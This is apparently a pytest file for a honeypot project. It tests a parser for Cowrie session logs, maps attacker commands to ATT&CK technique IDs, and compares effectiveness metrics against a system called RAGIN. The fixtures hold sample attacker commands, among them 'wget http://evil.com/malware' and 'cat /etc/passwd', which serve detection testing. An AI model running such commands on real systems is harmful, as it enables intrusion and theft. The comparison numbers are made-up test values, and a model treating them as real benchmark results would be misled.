"""Tests for the Cowrie log adapter and RAGIN comparison."""

from __future__ import annotations

import json
from pathlib import Path

from ragin.benchmark.cowrie_adapter import (
    CowrieAdapter,
    CowrieLogParseResult,
    CowrieSession,
)
from ragin.benchmark.effectiveness import (
    EffectivenessComparison,
    EffectivenessMetrics,
)

# ── Helpers ────────────────────────────────────────────────────────────


def _make_event(
    eventid: str,
    session: str = "sess1",
    src_ip: str = "10.0.0.1",
    **extra: object,
) -> str:
    base = {"eventid": eventid, "session": session, "src_ip": src_ip, "timestamp": "2024-01-01T00:00:00Z"}
    base.update(extra)
    return json.dumps(base)


def _sample_log_lines(count: int = 6) -> list[str]:
    lines = [
        _make_event("cowrie.login.success", session="s1", username="root", password="toor"),
        _make_event("cowrie.command.input", session="s1", input="whoami"),
        _make_event("cowrie.command.input", session="s1", input="cat /etc/passwd"),
        _make_event("cowrie.session.file_download", session="s1"),
        _make_event("cowrie.login.success", session="s2", username="admin", password="1234"),
        _make_event("cowrie.command.input", session="s2", input="ls -la"),
    ]
    return lines[:count]


# ── CowrieSession ──────────────────────────────────────────────────────


class TestCowrieSession:
    def test_empty_session_not_engaged(self) -> None:
        s = CowrieSession(session_id="empty")
        assert not s.is_engaged

    def test_engaged_with_commands(self) -> None:
        s = CowrieSession(session_id="e1", commands=["whoami", "ls"])
        assert s.is_engaged
        assert len(s.unique_commands) == 2

    def test_unique_commands_deduplicates(self) -> None:
        s = CowrieSession(session_id="d1", commands=["whoami", "whoami", "id", "whoami"])
        assert s.unique_commands == ["whoami", "id"]

    def test_ttps_from_commands(self) -> None:
        s = CowrieSession(
            session_id="t1",
            commands=["whoami", "cat /etc/passwd", "wget http://evil.com/malware", "ls"],
        )
        ttps = s.ttps_from_commands
        assert "T1033" in ttps
        assert "T1003.008" in ttps
        assert "T1105" in ttps
        assert "T1083" in ttps

    def test_ttps_empty_commands(self) -> None:
        s = CowrieSession(session_id="t2")
        assert s.ttps_from_commands == set()

    def test_ttps_unrecognized_commands(self) -> None:
        s = CowrieSession(session_id="t3", commands=["echo hello world"])
        assert s.ttps_from_commands == set()


# ── CowrieLogParseResult ───────────────────────────────────────────────


class TestCowrieLogParseResult:
    def test_empty_result(self) -> None:
        r = CowrieLogParseResult()
        assert r.session_count == 0
        assert r.engaged_sessions == 0
        assert r.all_commands == []
        assert r.all_ttps == set()

    def test_engaged_sessions_count(self) -> None:
        r = CowrieLogParseResult()
        r.sessions["s1"] = CowrieSession(session_id="s1", commands=["whoami"])
        r.sessions["s2"] = CowrieSession(session_id="s2")
        assert r.engaged_sessions == 1


# ── CowrieAdapter.parse_lines ─────────────────────────────────────────


class TestCowrieAdapterParse:
    def setup_method(self) -> None:
        self.adapter = CowrieAdapter()

    def test_empty_input(self) -> None:
        result = self.adapter.parse_lines([])
        assert result.session_count == 0
        assert result.total_events == 0

    def test_single_login_event(self) -> None:
        lines = [_make_event("cowrie.login.success", session="s1", username="root")]
        result = self.adapter.parse_lines(lines)
        assert result.session_count == 1
        s = result.sessions["s1"]
        assert s.successful_logins == 1
        assert s.login_attempts == 1

    def test_failed_login_counted(self) -> None:
        lines = [
            _make_event("cowrie.login.failed", session="s1"),
            _make_event("cowrie.login.failed", session="s1"),
        ]
        result = self.adapter.parse_lines(lines)
        assert result.sessions["s1"].login_attempts == 2
        assert result.sessions["s1"].successful_logins == 0

    def test_commands_tracked(self) -> None:
        lines = [
            _make_event("cowrie.command.input", session="s1", input="whoami"),
            _make_event("cowrie.command.input", session="s1", input="id"),
        ]
        result = self.adapter.parse_lines(lines)
        assert result.sessions["s1"].commands == ["whoami", "id"]

    def test_file_download_tracked(self) -> None:
        lines = [
            _make_event("cowrie.session.file_download", session="s1"),
            _make_event("cowrie.session.file_upload", session="s1"),
        ]
        result = self.adapter.parse_lines(lines)
        assert result.sessions["s1"].files_downloaded == 1
        assert result.sessions["s1"].files_uploaded == 1

    def test_multi_session(self) -> None:
        lines = [
            _make_event("cowrie.login.success", session="s1"),
            _make_event("cowrie.login.success", session="s2"),
            _make_event("cowrie.command.input", session="s1", input="whoami"),
        ]
        result = self.adapter.parse_lines(lines)
        assert result.session_count == 2
        assert result.engaged_sessions == 1

    def test_invalid_json_handled(self) -> None:
        lines = ["not valid json", _make_event("cowrie.login.success", session="s1")]
        result = self.adapter.parse_lines(lines)
        assert result.parse_errors == 1
        assert result.session_count == 1

    def test_empty_lines_skipped(self) -> None:
        lines = ["", "  ", _make_event("cowrie.login.success", session="s1")]
        result = self.adapter.parse_lines(lines)
        assert result.total_events == 1
        assert result.session_count == 1

    def test_src_ip_propagated(self) -> None:
        lines = [
            _make_event("cowrie.login.success", session="s1", src_ip="192.168.1.100"),
            _make_event("cowrie.command.input", session="s1", input="whoami"),
        ]
        result = self.adapter.parse_lines(lines)
        assert result.sessions["s1"].src_ip == "192.168.1.100"


# ── CowrieAdapter.parse_file ──────────────────────────────────────────


class TestCowrieAdapterParseFile:
    def test_parse_file(self, tmp_path: Path) -> None:
        log_file = tmp_path / "cowrie.json"
        lines = _sample_log_lines()
        log_file.write_text("\n".join(lines) + "\n")
        adapter = CowrieAdapter()
        result = adapter.parse_file(str(log_file))
        assert result.session_count == 2
        assert result.total_events == 6

    def test_parse_file_not_found(self) -> None:
        adapter = CowrieAdapter()
        result = adapter.parse_file("/nonexistent/path.json")
        assert result.session_count == 0


# ── CowrieAdapter.to_metrics ──────────────────────────────────────────


class TestCowrieAdapterMetrics:
    def setup_method(self) -> None:
        self.adapter = CowrieAdapter()

    def test_empty_metrics(self) -> None:
        result = self.adapter.parse_lines([])
        metrics = self.adapter.to_metrics(result)
        assert metrics.total_sessions == 0
        assert metrics.composite_score() == 0.0

    def test_engagement_rate(self) -> None:
        lines = [
            _make_event("cowrie.login.success", session="s1"),
            _make_event("cowrie.command.input", session="s1", input="whoami"),
            _make_event("cowrie.login.success", session="s2"),
        ]
        result = self.adapter.parse_lines(lines)
        metrics = self.adapter.to_metrics(result)
        assert metrics.total_sessions == 2
        assert metrics.sessions_with_engagement == 1
        assert metrics.engagement_rate == 0.5

    def test_ttps_detected(self) -> None:
        lines = [
            _make_event("cowrie.command.input", session="s1", input="whoami"),
            _make_event("cowrie.command.input", session="s1", input="cat /etc/passwd"),
            _make_event("cowrie.command.input", session="s2", input="ls -la"),
        ]
        result = self.adapter.parse_lines(lines)
        metrics = self.adapter.to_metrics(result)
        assert metrics.ttps_detected >= 2
        assert metrics.ttps_detected_unique >= 3

    def test_artifacts_accessed_from_downloads(self) -> None:
        lines = [
            _make_event("cowrie.login.success", session="s1"),
            _make_event("cowrie.session.file_download", session="s1"),
        ]
        result = self.adapter.parse_lines(lines)
        metrics = self.adapter.to_metrics(result)
        assert metrics.deception_artifacts_accessed == 1

    def test_no_persona(self) -> None:
        lines = [_make_event("cowrie.login.success", session="s1")]
        result = self.adapter.parse_lines(lines)
        metrics = self.adapter.to_metrics(result)
        assert metrics.persona_correct_assignments == 0
        assert metrics.persona_total_assignments == 0
        assert metrics.persona_accuracy == 0.0

    def test_no_strategy_adaptations(self) -> None:
        lines = [_make_event("cowrie.login.success", session="s1")]
        result = self.adapter.parse_lines(lines)
        metrics = self.adapter.to_metrics(result)
        assert metrics.strategy_adaptations == 0

    def test_retention_from_commands(self) -> None:
        lines = [
            _make_event("cowrie.command.input", session="s1", input="whoami"),
            _make_event("cowrie.command.input", session="s1", input="id"),
            _make_event("cowrie.command.input", session="s1", input="ls"),
        ]
        result = self.adapter.parse_lines(lines)
        metrics = self.adapter.to_metrics(result)
        assert metrics.attacker_retention_turns == 3.0
        assert metrics.max_retention_turns == 3

    def test_composite_score_range(self) -> None:
        lines = _sample_log_lines()
        result = self.adapter.parse_lines(lines)
        metrics = self.adapter.to_metrics(result)
        score = metrics.composite_score()
        assert 0.0 <= score <= 1.0


# ── RAGIN vs Cowrie Comparison ─────────────────────────────────────────


class TestComparisonWithRAGIN:
    def test_ragin_outperforms_cowrie(self) -> None:
        cowrie_metrics = EffectivenessMetrics(
            honeytoken_triggers=1,
            honeytokens_deployed=10,
            total_sessions=10,
            sessions_with_engagement=5,
            persona_correct_assignments=0,
            persona_total_assignments=0,
            ttps_detected=3,
            ttps_detected_unique=5,
            cti_alerts_generated=3,
            false_positives=0,
            true_positives=3,
            attacker_retention_turns=2.0,
            max_retention_turns=5,
            mean_session_duration_s=120.0,
            deception_artifacts_deployed=10,
            deception_artifacts_accessed=2,
            strategy_adaptations=0,
            avg_response_time_ms=0.0,
        )

        ragin_metrics = EffectivenessMetrics(
            honeytoken_triggers=5,
            honeytokens_deployed=10,
            total_sessions=10,
            sessions_with_engagement=8,
            persona_correct_assignments=9,
            persona_total_assignments=10,
            ttps_detected=7,
            ttps_detected_unique=12,
            cti_alerts_generated=7,
            false_positives=1,
            true_positives=6,
            attacker_retention_turns=4.5,
            max_retention_turns=10,
            mean_session_duration_s=300.0,
            deception_artifacts_deployed=20,
            deception_artifacts_accessed=10,
            strategy_adaptations=5,
            avg_response_time_ms=150.0,
        )

        comparison = EffectivenessComparison(
            benchmark_id="cowrie_vs_ragin_001",
            name="RAGIN vs Cowrie Baseline",
            description="Compare RAGIN honeypot effectiveness against Cowrie",
            baseline_metrics=cowrie_metrics,
            current_metrics=ragin_metrics,
        )
        improvement = comparison.compute_improvement()
        grade = comparison.assign_grade()

        assert improvement["composite_score"] > 0
        assert improvement["honeytoken_trigger_rate"] > 0
        assert improvement["engagement_rate"] > 0
        assert grade in ("A", "B", "C", "D", "F")

    def test_comparison_to_dict(self) -> None:
        comparison = EffectivenessComparison(
            benchmark_id="test_001",
            name="Test",
            description="Test comparison",
            baseline_metrics=EffectivenessMetrics(total_sessions=5),
            current_metrics=EffectivenessMetrics(total_sessions=10),
        )
        comparison.compute_improvement()
        d = comparison.to_dict()
        assert d["benchmark_id"] == "test_001"
        assert "baseline" in d
        assert "current" in d
        assert "improvement_pct" in d


# ── Adapter integration with EffectivenessBenchmark ────────────────────


class TestBenchmarkIntegration:
    def test_full_benchmark_flow(self) -> None:
        from ragin.benchmark.effectiveness import EffectivenessBenchmark

        adapter = CowrieAdapter()
        cowrie_result = adapter.parse_lines(_sample_log_lines())
        cowrie_metrics = adapter.to_metrics(cowrie_result)

        ragin_metrics = EffectivenessMetrics(
            honeytoken_triggers=5,
            honeytokens_deployed=10,
            total_sessions=2,
            sessions_with_engagement=2,
            persona_correct_assignments=2,
            persona_total_assignments=2,
            ttps_detected=3,
            ttps_detected_unique=8,
            cti_alerts_generated=3,
            false_positives=0,
            true_positives=3,
            attacker_retention_turns=3.0,
            max_retention_turns=5,
            mean_session_duration_s=200.0,
            deception_artifacts_deployed=10,
            deception_artifacts_accessed=5,
            strategy_adaptations=3,
            avg_response_time_ms=120.0,
        )

        bench = EffectivenessBenchmark()
        bench.register_baseline("cowrie", cowrie_metrics)
        result = bench.run_benchmark(
            name="ragin_vs_cowrie",
            baseline_name="cowrie",
            current_metrics=ragin_metrics,
            description="Full comparison",
        )

        assert result.grade in ("A", "B", "C", "D", "F")
        assert "composite_score" in result.improvement_pct
